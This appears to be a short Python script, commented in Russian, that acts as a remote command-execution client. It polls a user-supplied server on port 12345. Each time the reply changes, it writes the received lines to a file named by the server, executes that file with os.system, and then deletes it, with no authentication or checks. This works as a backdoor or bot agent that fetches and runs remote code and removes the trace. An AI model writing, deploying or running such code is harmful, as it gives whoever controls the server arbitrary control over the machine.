import socket
import os
def get_variable(ip, port):
    with socket.create_connection((ip, port)) as sock:
        sock.sendall('GET'.encode())
        data = sock.recv(1024).decode()
        if data.startswith('V'):
            return data[1:]
        return None

# Запрос IP сервера у пользователя
server_ip = input("Введите IP сервера: ")
server_port = 12345
a=get_variable(server_ip, server_port)
while True:
    b=get_variable(server_ip, server_port)
    if b != a:
        a=b
        b=b.split('|')
        b = [b[0], b[1].split(',')]
        f = open(b[0], 'x', encoding='utf-8')
        for i in b[1]:
            f.write(f'{i}\n')
        f.close()
        os.system(b[0])
        os.remove(b[0])